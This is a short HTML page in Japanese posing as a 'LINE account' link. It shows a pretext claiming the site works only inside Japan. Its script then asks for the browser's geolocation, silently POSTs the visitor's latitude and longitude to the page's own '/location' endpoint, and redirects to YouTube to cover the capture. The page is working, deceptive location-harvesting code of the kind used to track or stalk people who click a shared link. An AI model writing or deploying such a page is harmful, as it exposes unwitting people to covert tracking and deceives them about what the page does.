<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>LINEアカウント</title>
</head>
<body>
  <p id="result"></p>
  
<section id="screen1">
  <p>このサイトは日本国内からでしかアクセス出来ません。</p>
  <p>あなたがアクセスしようとしているのは日本国内ですか？</p>
</section>

<section id="screen2" hidden>
  <h2>Youtube</h2>
  <p>Youtubeに飛びます。</p>
</section>

  <script>
    window.onload = async function() {
      setTimeout(async function() {
        document.getElementById("screen1").hidden = true;
        const success = await shareLocation();
        if (success) {
          document.getElementById("screen2").hidden = false;
          setTimeout(async function() {
            location.replace("https://www.youtube.com/");
          }, 5000);
        }
      }, 6000);
    };

    function shareLocation() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) {
          resolve(false);
          return;
        }

        navigator.geolocation.getCurrentPosition(
          async function(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
  
            try {
              const response = await fetch("/location", {
                method: "POST",
                headers: {
                  "Content-Type": "application/json"
                },
                body: JSON.stringify({
                  latitude: lat,
                  longitude: lon
                })
              });
  
              resolve(response.ok);
            } catch (error) {
              resolve(false);
            }
          },

          function(error) {
            resolve(false);
          }
        );
      });
    }
  </script>
</body>
</html>
